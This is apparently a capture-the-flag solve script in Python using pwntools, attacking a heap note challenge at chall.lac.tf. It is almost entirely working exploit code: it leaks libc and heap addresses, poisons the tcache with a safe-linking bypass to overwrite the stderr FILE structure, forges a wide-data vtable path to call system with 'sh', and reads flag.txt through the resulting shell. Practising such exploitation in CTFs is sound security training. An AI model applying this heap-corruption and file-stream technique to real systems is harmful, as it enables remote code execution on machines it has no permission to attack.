#!/usr/bin/python3
from pwn import *


# Edit these placeholders: ./chall_patched ./libc.so.6 amd64
context.binary = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.arch = "amd64"


script = '''
set debuginfod enable on
b*main+149
b*exit
b*_IO_flush_all
c
'''
# p = gdb.debug(exe.path , gdbscript = script)
p = remote("chall.lac.tf" , port = 31144)


def slog(name , addr): return success(": ".join([name , hex(addr)]))
def s(payload):
    sleep(1.5)
    p.send(payload)
def sl(payload):
    sleep(1.5)
    p.sendline(payload)
def sa(info , payload):
    p.sendafter(info , payload)
def sla(info , payload):
    p.sendlineafter(info , payload)
def ru(payload):
    return p.recvuntil(payload)
def rn(payload):
    return p.recvn(payload)
def rln():
    return p.recvline()


def create(idx , size , data):
    sla(b'Choice > ' , b'1')
    sla(b'Index: ' , f'{idx}'.encode())
    sla(b'Size: ' , f'{size}'.encode())
    sa(b'Data: ' , data)
def delete(idx):
    sla(b'Choice > ' , b'2')
    sla(b'Index: ' , f'{idx}'.encode())
def print(idx):
    sla(b'Choice > ' , b'3')
    sla(b'Index: ' , f'{idx}'.encode())

create(0 , 0 , b'A')
delete(0)
create(0 , 0xf8 , b'A' * 0x8)
create(1 , 0xf8 , b'B' * 0x8)
delete(1)
delete(0)

create(0 , 0xf8 - 0x10 , b'B' * 0x8)
create(1 , 0xf8 - 0x10 , b'B' * 0x8)
delete(0)
delete(1)
create(0 , 0xf8 - 0x20 , b'B' * 0x8)
create(1 , 0xf8 - 0x20 , b'B' * 0x8)
delete(0)
delete(1)
create(0 , 0xf8 - 0x30 , b'B' * 0x8)
create(1 , 0xf8 - 0x30 , b'B' * 0x8)
delete(0)
delete(1)
create(1 , 0xf8 , b'B' * 0x8)

create(0 , 0 , flat({
    0x18:[0x671]
} , filler = b'\x00'))
delete(0)
delete(1)
create(1 , 0xf8 - 0x40 , b'\xe0')
print(1)
libc.address = u64(rn(6) + b'\x00' * 2) - 0x21b1e0
slog("libc base" , libc.address)
slog("system" , libc.sym.system)
delete(1)
create(1 , 0xf8 - 0x40 , b'A' * 0x10)
print(1)
ru(b'A' * 0x10)
heap = u64(rn(6) + b'\x00' * 2) - 0x2b0
slog("heap base" , heap)
poison_chunk = heap + 0x2c0
create(0 , 0 , flat({
    0x18:[0x101]
} , filler = b'\x00'))
delete(0)
delete(1)

create(0 , 0 , flat({
    0x18:[0x101 , (poison_chunk >> 12) ^ (libc.sym._IO_2_1_stderr_ - 0x10)]
} , filler = b'\x00'))
delete(0)
fp = FileStructure()
fp.flags = u32("  sh")
fp.vtable = libc.sym._IO_wfile_jumps
fp._wide_data = heap + 0x2c0
fp._IO_read_ptr = 0
fp._IO_read_end = 0
fp._IO_read_base = 0
fp._IO_write_ptr = 1
fp._IO_write_end = 0
fp._IO_write_base = 0
fp._IO_buf_end = 0
fp._IO_buf_base = 0
fp._lock = libc.address + 0x205710

create(1 , 0xf8 , b'A' * 0x10)
create(0 , 0xf8 , flat({
    0x10:[
        bytes(fp)
    ]
} , filler = b'\x00'))
delete(1)
create(1 , 0xf8 , flat({
    0x68:[libc.sym.system],
    0xe0:[heap + 0x2c0],

} , filler = b'\x00'))
sla(b'Choice > ' , b'4')
sl("cat flag.txt")
p.interactive()
